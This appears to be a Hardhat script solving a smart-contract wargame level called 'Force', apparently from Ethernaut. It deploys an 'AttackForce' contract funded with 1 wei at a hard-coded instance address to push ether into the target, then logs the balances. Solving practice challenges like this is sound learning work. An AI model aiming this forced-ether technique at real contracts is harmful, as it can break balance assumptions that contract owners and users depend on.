const hre = require("hardhat");

async function main() {
  const ForceContract = await hre.ethers.getContractFactory("Force");
  // attach your instance address
  const Instance = "0xF394F3BDfDeD9F20AA2f32E4FCF8D814fd16FfF1";
  const Force = ForceContract.attach(Instance);
  const oldBalance = await ethers.provider.getBalance(Force.address);
  const AttackForceContract = await ethers.getContractFactory("AttackForce");
  const AttackForce = await AttackForceContract.deploy(Force.address, {
    value: hre.ethers.utils.parseEther("0.000000000000000001"),
  });
  await AttackForce.deployed();
  const updatedBalance = await ethers.provider.getBalance(Force.address);
  console.log(oldBalance, updatedBalance);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
